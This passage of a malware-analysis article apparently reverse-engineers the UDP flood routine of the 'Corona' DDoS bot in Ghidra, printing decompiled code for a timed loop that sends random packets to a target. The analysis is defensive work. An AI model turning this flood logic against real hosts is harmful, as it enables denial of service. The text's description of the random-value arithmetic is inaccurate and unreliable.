local_5c = (char)iVar1 + (char)(iVar1 / 0x46) * -0x46;\n  *pcVar3 = local_5c + 0x1e;\n  connect(__fd,(sockaddr *)&local_48,0x10);\n  send(__fd,__buf,0x400,0);\n }\n free(__buf);\n return;\n}\n\n```\nBased on this, the first two parameters can be observed in a single glance. The first one is\nthe address of the vicitm, whilst the second one is the victim’s port. The arguments can be\nrenamed target_address and target_port respectively. The local_48 variable can be renamed\nto socketAddress.\n\nThe socket is a AF_INET _SOCK_DGRAM socket using the default protocol. The_\n_SOCK_DGRAM type is used to make a UDP connection._\n\nThe rest of the function is given below.\n\n\n-----\n\n```\ntVar2 time((time_t )0x0);\nwhile( true ) {\n lVar4 = (long)((int)tVar2 + param_3);\n tVar1 = time((time_t *)0x0);\n if (lVar4 <= tVar1) break;\n pcVar3 = (char *)((long)__buf + 0x400);\n iVar1 = rand();\n local_5c = (char)iVar1 + (char)(iVar1 / 0x46) * -0x46;\n *pcVar3 = local_5c + 0x1e;\n connect(__fd,(sockaddr *)&socketAddress,0x10);\n send(__fd,__buf,0x400,0);\n}\nfree(__buf);\n\n```\nThe variabled named tVar2 is equal to the amount of seconds that have passed since epoch,\nand can thus be renamed to currentTime. The variable lVar4 is equal to the current time plus\nthe third parameter. After that, another variable is set equal to the current time, this variable\ncan be renamed to newTime.\n\nIf the newTime variable is bigger than (or equal to) than the the first moment in time plus the\nvalue of the third parameter, the endless while-loop exits. Based on this, one can deduce\nthat the third parameter is equal to the value in seconds that the attack should last.\nTherefore, the third variable can be renamed to attackDuration. The lVar4 variable can be\nrenamed to finalTime.\n\n[After that, the __buf variable is filled with random variables. The rand function was seeded in](https://www.tutorialspoint.com/c_standard_library/c_function_rand.htm)\nthe main function, based on the then current time and process ID. The random value is\ndivided by 0x46, after which 0x46 is subtracted. The value is then stored in the buffer, after\nwhich a connection to the target is made and the data is sent. The refactored code is given\nbelow.\n```\nwhile( true ) {\n finalTime = (long)((int)currentTime + attackDuration);\n newTime = time((time_t *)0x0);\n if (finalTime <= newTime) break;\n bufferPointer = (char *)((long)__buf + 0x400);\n randomValue = rand();\n subtractedRandomValue = (char)randomValue + (char)(randomValue / 0x46) * -0x46;\n *bufferPointer = subtractedRandomValue + 0x1e;\n connect(__fd,(sockaddr *)&socketAddress,0x10);\n send(__fd,__buf,0x400,0);\n}\n\n```\nThe other attacks will construct the request (or payload, depending on your definition and\nperspective) differently. Going into those will be needlessly lengthy without adding much\nvalue to this article.\n\n## Conclusion\n\n\n-----\n\nOther attacks require more specific arguments, but the base line has been set, which allows\nthe reverse engineer to get a basic understanding of the command scheme that is used\nwithin the bot. When analysing the logs of a hacked machine that was used as a bot, it is\nnow possible to understand which targets were attacked and how long the attacks took\nplace.\n\nAdditionally, some core concepts of Ghidra have been explorered and used during the\nanalysis. When working with the correct data types, the code (be it disassembly or\ndecompiled) is much more accurate. This leads to less mistakes and a quicker analysis while\nthere are no downsides.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2019/2019-10-14 - Corona DDoS bot.pdf"
    ],
    "report_names": [
        "2019-10-14 - Corona DDoS bot.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535916,
    "ts_updated_at": 1743041137,
    "ts_creation_date": 1653709827,
    "ts_modification_date": 1653709827,
    "files": {
        "pdf": "https://archive.orkl.eu/6fd642a6675280cfebd9304825f18329f91cbe51.pdf",
        "text": "https://archive.orkl.eu/6fd642a6675280cfebd9304825f18329f91cbe51.txt",
        "img": "https://archive.orkl.eu/6fd642a6675280cfebd9304825f18329f91cbe51.jpg"
    }
}